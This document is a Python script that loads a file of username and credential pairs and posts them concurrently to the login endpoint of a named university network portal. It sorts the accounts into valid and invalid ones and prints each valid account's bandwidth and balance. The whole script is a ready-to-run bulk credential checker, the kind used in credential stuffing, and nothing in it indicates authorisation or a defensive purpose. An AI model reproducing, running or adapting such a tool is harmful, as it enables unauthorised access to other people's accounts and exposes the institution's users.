#!/usr/bin/env python

import requests
import argparse
import re
from urllib.parse import urlencode
from urllib.parse import unquote
from concurrent.futures import ThreadPoolExecutor


class CheckData:
    def __init__(self):
        self.url = "https://netsurf.lmu.edu.ng/ajax/bals.php"
        self.s = requests.Session()
        self.s.get(self.url)

        self.header = {"Accept-Encoding":"gzip", "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
        self.credentials = {}
        self.processed_response = {}
        self.tails = []
        # self.proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


    def add_flags(self):
        ''' The function that gets all flags'''
        parser = argparse.ArgumentParser()
        parser.add_argument('-f', type=str, help='The file that contains usernames and passwords')
        args = parser.parse_args()
        # The flag passed from the command line
        file = args.f
        # print(file)
        return file


    def get_creds(self):
        '''get contents of credentials.txt and append to tails list'''
        file = self.add_flags()
        #open, get contents of credentials.txt and append to credentials dictionary
        fileObject = open(file, 'r')
        fileContents = fileObject.read()
        arr = fileContents.split("\n")
        # remove all appearances of empty strings from the array/list
        arr = [i for i in arr if i != ""]  
        # print(arr)
        for i in arr:
            arr = i.split(":")
            self.credentials[arr[1]] = arr[0]
            self.tails.append(arr[1])
        # print(self.credentials)
        

    def login(self, tail):
        # r = requests.post(url1, data={"username":"chukwu.toochukwu", "password":"", "submit":"Submit"}, proxies=proxy, verify=False)
        r = self.s.post(self.url, data=unquote(urlencode({"head":'["shgBKOVPjxE=","G3EkHHMA/aU=","olvO0CaThvf4kUsw","olvO0CaThvf4kUsw"]', "tail":f'{tail}'})), headers=self.header)
        # print(r.status_code)
        # print(r.text)
        if "Invalid Username/Password" in r.text:
            name = self.credentials[tail]
            datadigits = ["Invalid Username/Password"]
        else:
            name = re.search("([a-z]*\.[a-z]*|[A-Za-z0-9]+[0-9]{4,5})", r.text)
            datadigits = re.findall("-?[0-9]{1,3}\.[0-9]{1,3} [A-Za-z]*", r.text)
            name = name.group(0)

        self.update_database(name, datadigits)
        

    def go_fast(self, tails):
        ''''''
        with ThreadPoolExecutor() as executor:
            return executor.map(self.login, self.tails)


    def update_database(self, name, datadigits):
        self.processed_response[name] = datadigits
        # print(name, datadigits)
    

    def display_positive_results(self, processed_response):
        print("Username", "\t", "Total Bandwidth", "\t", "Total Used", "\t", "Total Balance")
        print("----------------------------------------------------------------------------")
        for i in processed_response:
            # print( len(processed_response[i]) )
            if len(processed_response[i]) > 1:
                print(i, "-->", "\t", processed_response[i][0], "\t", processed_response[i][1], "\t", processed_response[i][2])


    def display_negative_results(self, processed_response):
        print("\n")
        for i in processed_response:
            if len(processed_response[i]) == 1:
                print(i, "-->", "\t", processed_response[i][0])


    def start(self):
        self.get_creds()
        self.go_fast(self.tails)

        self.display_positive_results(self.processed_response)
        self.display_negative_results(self.processed_response)


bot = CheckData()
bot.start()